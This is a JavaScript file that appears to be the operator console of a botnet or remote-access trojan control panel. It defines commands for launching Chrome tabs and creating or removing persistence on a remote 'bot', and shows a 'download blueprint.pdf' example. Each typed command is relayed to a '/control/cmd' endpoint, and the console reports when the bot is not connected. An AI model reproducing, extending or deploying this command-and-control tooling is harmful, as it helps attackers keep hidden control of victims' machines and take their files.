'use strict';

const commands = {
    

    chrome: { id: 6, help: 'Launch Chrome browser', usage: '\t\t\tchrome <tab1> <tab2> <tabn>' },

    persist_create: { id: 8, help: 'Create persistence', usage: '\t\t\tpersist_create' },
    persist_remove: { id: 9, help: 'Remove persistence', usage: '\t\t\tpersist_remove' },

   
};

const CommandsEnum = { commands: 'commands', help: 'help' };

class Command extends Terminal {
    constructor() {
        Terminal.isSSH = false;
        super();
    }

    get mainMenu() {
        return (
            '<p>' +
            '<span>Type [command] + <kbd>Enter</kbd></span>' +
            '</p>' +
            '<ul style="list-style: none;">' +
            "<li>'help' -- display this list</li>" +
            "<li>'cls' -- clear screeen</li>" +
            "<li>'commands' -- display commands</li>" +
            '</ul>'
        );
    }

    get commands() {
        let displayed = false;
        let cmdOutput = '';
        let command;

        for (let cmd in commands) {
            if (!displayed) {
                displayed = true;
                cmdOutput += '\t# --------[ Available Commands ]-------- #\n\n';
            }

            command = commands[cmd];

            cmdOutput +=
                '\t' +
                cmd +
                '\t'.repeat(cmd.length < 8 ? 2 : 1) +
                command['help'] +
                '\t'.repeat(command['usage'].length < 15 ? 2 : 1) +
                command['usage'] +
                '\n';
        }

        cmdOutput +=
            '\n\tOverride a running process by using --override after the args\n' +
            '\tExample: download blueprint.pdf --override\n';

        return cmdOutput;
    }


    execute(cmd) {
        // let command=cmd
        // if (!(command in commands)) {
        //     if (command === CommandsEnum.commands) {
        //         this.stopExe(cmd, this.commands);
        //         return;
        //     } else if (command === CommandsEnum.help) {
        //         this.stopExe(cmd, '');
        //         $('#console-output').append(terminalObj.mainMenu);
        //         this.scroll();
        //         return;
        //     }

        //     this.stopExe(cmd, "'" + cmd.split(' ')[0] + "'" + ' is not recognized as a command');
        //     return;
        // } else {
        //     this.startExe();
        // }
        this.startExe();
        console.log("data send cmd: "+cmd);
        $.ajax({
            type: 'POST',
            url: '/control/cmd',
            data: { cmd:cmd },
            beforeSend: request => {
                request.setRequestHeader('X-CSRFToken', $('#csrf_token').val());
            }
        })
            .done(resp => {
                let msg;
                console.log(resp);
                if (resp['resp'].length !== 0) {
                    msg = resp['resp'];
                } else {
                    msg = 'Bot is not connected';
                }

                if (!Terminal.isSSH) {
                    this.stopExe(cmd, msg);
                } else {
                    this.stopExe('', '');
                }

                if (resp['resp'].length === 0) {
                    disableConsole();
                    updateStatus();
                }
            })
            .fail(() => {
                this.stopExe(cmd, 'Failed to contact server');
            });
    }
}
